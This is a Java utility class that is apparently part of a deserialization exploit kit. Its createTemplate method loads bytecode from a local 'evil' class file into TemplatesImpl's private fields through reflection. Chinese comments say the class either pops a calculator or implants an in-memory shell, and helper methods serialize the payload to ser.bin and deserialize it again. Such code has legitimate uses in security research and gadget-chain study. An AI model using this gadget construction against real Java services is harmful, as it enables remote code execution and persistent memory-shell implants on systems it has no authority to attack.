package com.mechoy;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.springframework.util.FileCopyUtils;

import java.io.*;
import java.lang.reflect.Field;

public class Utils {

    final static String path = "ser.bin";
    // 弹个计算器evilexp.class
//    static String classPath = "D:\\tools\\exp\\class\\evilexp.class";
    // 加个内存吗
    static String classPath = "D:\\tools\\exp\\class\\A510e2fb689a74c25b8e1f9ec625ad3cb.class";

    public static TemplatesImpl createTemplate() throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"zzz");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        byte[][] b = {classBytes(classPath)};
        bytecodes.set(templates,b);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());
        return templates;
    }


    public static byte[] classBytes(String path) throws IOException {
        FileInputStream fis = new FileInputStream(path);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int len;
        while ((len = fis.read(buffer)) != -1) {
            baos.write(buffer, 0, len);
        }
        byte[] classBytes = baos.toByteArray();
        return classBytes;
    }

    public static byte[] base64ToByte(String base){
//        byte[] bytes = Base64.getDecoder().decode(base);
//        return bytes;
        return null;
    }

    public static String bytesToHex(byte[] bArray, int length) {
        StringBuffer sb = new StringBuffer(length);

        for(int i = 0; i < length; ++i) {
            String sTemp = Integer.toHexString(255 & bArray[i]);
            if (sTemp.length() < 2) {
                sb.append(0);
            }

            sb.append(sTemp.toUpperCase());
        }
        return sb.toString();
    }

    /**
     * 将指定对象转为字节数组
     * @param obj
     * @return
     * @throws IOException
     */
    public static byte[] objectToByte(Object obj) throws IOException {
        ByteArrayOutputStream b = new ByteArrayOutputStream();
        ObjectOutput a = new ObjectOutputStream(b);

        // write and flush the object content to byte array
        a.writeObject(obj);
        a.flush();
        a.close();
        return b.toByteArray();
    }

    public static String readClassStr(String cls){
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        try {
            FileCopyUtils.copy(new FileInputStream(new File(cls)),byteArrayOutputStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encode(byteArrayOutputStream.toByteArray());
    }

    public static void serialize(Object obj) throws IOException {
        FileOutputStream fos = new FileOutputStream("ser.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        if (fos!=null){
            fos.close();
        }

        if (oos!=null){
            oos.close();
        }
    }

    public static Object deserialize() throws IOException, ClassNotFoundException {
        FileInputStream fis = new FileInputStream(path);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object o = ois.readObject();
        return o;
    }
}
